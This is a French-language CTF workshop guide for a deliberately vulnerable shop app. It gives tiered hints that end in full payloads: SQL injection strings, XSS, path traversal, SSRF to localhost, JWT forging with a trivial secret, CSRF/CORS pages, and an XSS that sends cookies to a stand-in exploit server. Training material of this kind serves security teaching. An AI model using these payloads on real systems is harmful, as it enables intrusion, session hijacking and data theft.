# BananaShop CTF - Workshop Guide

## Challenges

Les 15 challenges sont classés par difficulté croissante. Chaque flag est au format `ASY{...}`.

---

### Challenge #1 - Sensitive Data Exposure (Facile)

> Les développeurs laissent parfois des endpoints de debug en production...

<details>
<summary>Hint 1</summary>
Essayez d'accéder à des URLs d'API qui ne sont pas liées depuis l'interface.
</details>

<details>
<summary>Hint 2</summary>
Les endpoints de debug suivent souvent des conventions de nommage : /debug, /config, /status...
</details>

<details>
<summary>Hint 3</summary>
<code>GET /api/config</code>
</details>

---

### Challenge #2 - IDOR (Facile)

> Êtes-vous vraiment limité à votre propre profil ?

<details>
<summary>Hint 1</summary>
Regardez l'URL quand vous consultez votre profil. Que se passe-t-il si vous changez le numéro ?
</details>

<details>
<summary>Hint 2</summary>
Les IDs utilisateur sont des entiers séquentiels. Essayez 1, 2, 3...
</details>

<details>
<summary>Hint 3</summary>
<code>GET /api/users/3</code> - regardez le champ "bio"
</details>

---

### Challenge #3 - Reflected XSS (Facile-Moyen)

> Que se passe-t-il quand la recherche reflète votre saisie sans la nettoyer ?

<details>
<summary>Hint 1</summary>
La barre de recherche dans le Shop reflète le terme de recherche dans la page.
</details>

<details>
<summary>Hint 2</summary>
Essayez de mettre du HTML dans le champ de recherche. Est-il interprété ?
</details>

<details>
<summary>Hint 3</summary>
<code>/shop?search=&lt;img src=x onerror="fetch('/api/xss-flag?type=reflected').then(r=>r.json()).then(d=>alert(d.flag))"&gt;</code>
</details>

---

### Challenge #4 - SQL Injection (Moyen)

> Le formulaire de login accepte-t-il plus que des noms d'utilisateur ?

<details>
<summary>Hint 1</summary>
Essayez des caractères spéciaux dans le champ username : guillemets simples, doubles...
</details>

<details>
<summary>Hint 2</summary>
Le login utilise le username directement dans une requête SQL. Pensez à l'injection classique avec des commentaires SQL.
</details>

<details>
<summary>Hint 3</summary>
Username : <code>admin' --</code> (avec un espace avant le --), mot de passe : n'importe quoi
</details>

---

### Challenge #5 - Business Logic (Moyen)

> Les nombres peuvent aller dans les deux sens...

<details>
<summary>Hint 1</summary>
La fonctionnalité d'envoi de crédits vérifie-t-elle que le montant est positif ?
</details>

<details>
<summary>Hint 2</summary>
Que se passe-t-il si vous envoyez un montant négatif à un autre utilisateur ?
</details>

<details>
<summary>Hint 3</summary>
Envoyez <code>-5000</code> crédits à n'importe quel utilisateur. Le flag apparaît quand votre solde dépasse 9999.
</details>

---

### Challenge #6 - JWT Forging (Moyen-Difficile)

> Les secrets devraient être secrets. Celui-ci l'est-il ?

<details>
<summary>Hint 1</summary>
Examinez votre cookie de session. C'est un JWT. Décodez-le sur jwt.io.
</details>

<details>
<summary>Hint 2</summary>
Le JWT contient un champ "role". Si vous trouvez le secret de signature, vous pouvez le modifier. Le secret est... très simple. Essayez aussi l'algorithme "none".
</details>

<details>
<summary>Hint 3</summary>
Le secret JWT est littéralement la chaîne <code>"secret"</code>. Changez <code>"role":"user"</code> en <code>"role":"admin"</code>, re-signez, et accédez à /admin.
</details>

---

### Challenge #7 - Stored XSS (Difficile)

> Les avis sont rendus tels quels. Qu'est-ce que vous pourriez y injecter ?

<details>
<summary>Hint 1</summary>
Postez un avis sur un produit. Le contenu est-il échappé ?
</details>

<details>
<summary>Hint 2</summary>
Essayez de poster un avis contenant du HTML, par exemple <code>&lt;b&gt;test&lt;/b&gt;</code>. S'il apparaît en gras, le XSS est possible.
</details>

<details>
<summary>Hint 3</summary>
<code>&lt;img src=x onerror="fetch('/api/xss-flag').then(r=>r.json()).then(d=>document.title=d.flag)"&gt;</code>
</details>

---

### Challenge #8 - Path Traversal (Facile)

> Les chemins mènent parfois plus loin que prévu...

<details>
<summary>Hint 1</summary>
L'application a un endpoint pour récupérer des fichiers. Regardez les endpoints liés aux produits.
</details>

<details>
<summary>Hint 2</summary>
<code>GET /api/products/image?file=organic.txt</code> - que se passe-t-il si vous remontez dans l'arborescence ?
</details>

<details>
<summary>Hint 3</summary>
<code>GET /api/products/image?file=../../secret_flag.txt</code>
</details>

---

### Challenge #10 - CSRF (Moyen)

> Quand un autre site agit en votre nom...

<details>
<summary>Hint 1</summary>
L'application n'a aucune protection CSRF. Le cookie de session est envoyé automatiquement par le navigateur.
</details>

<details>
<summary>Hint 2</summary>
Créez une page HTML qui soumet un formulaire POST vers l'API de transfert de crédits. Hébergez-la sur l'exploit-server.
</details>

<details>
<summary>Hint 3</summary>
Utilisez la page "CSRF Demo" de l'exploit-server pour générer le payload automatiquement. Le flag apparaît quand le transfert provient d'un autre site (Origin cross-origin).
</details>

---

### Bonus - CORS Reflection + Allow-Credentials (Difficile)

> Le CSRF permet d'envoyer des requêtes... mais peut-on aussi **lire** les réponses ?

<details>
<summary>Hint 1</summary>
Regardez les en-têtes CORS renvoyés par le serveur. Que vaut <code>Access-Control-Allow-Origin</code> ? Est-ce que <code>Access-Control-Allow-Credentials</code> est activé ?
</details>

<details>
<summary>Hint 2</summary>
La configuration <code>cors({ origin: true, credentials: true })</code> reflète n'importe quel Origin. Combiné avec <code>withCredentials</code>, un site malveillant peut lire les réponses authentifiées (profil, solde, etc.).
</details>

<details>
<summary>Hint 3</summary>
Créez une page sur l'exploit-server avec un <code>fetch('http://bananashop/api/users/me', { credentials: 'include' })</code>. Le navigateur enverra les cookies ET vous pourrez lire la réponse JSON, contrairement à un simple CSRF.
</details>

---

### Challenge #11 - SQL Injection UNION (Difficile)

> Quand une requête en cache une autre...

<details>
<summary>Hint 1</summary>
La recherche de produits est vulnérable à l'injection SQL. Essayez des caractères spéciaux dans la barre de recherche.
</details>

<details>
<summary>Hint 2</summary>
Utilisez UNION SELECT pour extraire des données d'autres tables. Combien de colonnes a la requête originale ?
</details>

<details>
<summary>Hint 3</summary>
<code>GET /api/products?search=' UNION SELECT 1,value,3,4,5,6 FROM secrets --</code>
</details>

---

### Challenge #12 - SSRF (Difficile)

> Le serveur fait confiance à vos URLs... même les internes.

<details>
<summary>Hint 1</summary>
Cherchez un endpoint qui permet d'importer quelque chose depuis une URL externe.
</details>

<details>
<summary>Hint 2</summary>
L'endpoint d'import d'image effectue un fetch côté serveur. Que se passe-t-il si vous pointez vers localhost ?
</details>

<details>
<summary>Hint 3</summary>
<code>POST /api/products/1/image-url</code> avec <code>{"url": "http://localhost:3000/api/internal/flag"}</code>
</details>

---

### Challenge #13 - Cookie Theft via XSS (Difficile)

> Voler un cookie, c'est voler une identité.

<details>
<summary>Hint 1</summary>
Le cookie de session n'est pas protégé par httpOnly. Il est accessible via JavaScript avec document.cookie.
</details>

<details>
<summary>Hint 2</summary>
Utilisez une XSS (réfléchie ou stockée) pour envoyer le cookie vers votre exploit-server (webhook).
</details>

<details>
<summary>Hint 3</summary>
Postez un avis contenant : <code>&lt;img src=x onerror="fetch('http://VOTRE-EXPLOIT-SERVER/steal?c='+document.cookie)"&gt;</code> - l'exploit-server détecte le JWT et donne le flag.
</details>
